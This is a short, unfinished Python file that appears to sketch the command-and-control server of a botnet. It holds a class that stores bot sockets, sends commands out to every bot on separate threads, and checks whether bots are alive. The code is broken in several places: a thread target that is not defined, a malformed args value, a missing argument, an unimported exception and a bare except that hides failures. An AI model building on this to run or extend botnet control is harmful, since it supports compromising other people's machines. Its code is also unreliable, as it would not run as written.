import threading

import botnet_exceptions


class C2server():

    def __init__(self, user_id, bot_socket):
        self.user_id = user_id
        self.bots = [bot_socket]

    def execute_command(self, command):
        """
        Command botnet to execute command
        :param command: Command
        :return: bool
        """
        if not self.bots:
            raise NoBotsException()

        # TODO: maybe use async and await every bot.execute_command()?
        for bot in self.bots:
            bot_thread = threading.Thread(command_bot, args=(command))
            bot_thread.start()

    def command_bot(self, command):
        self.check_connection()

    def check_connection(self, bot):
        try:
            bot.sendall(b"Are you alive?")
        # TODO: put in proper exception handling for dead socket
        except:
            pass
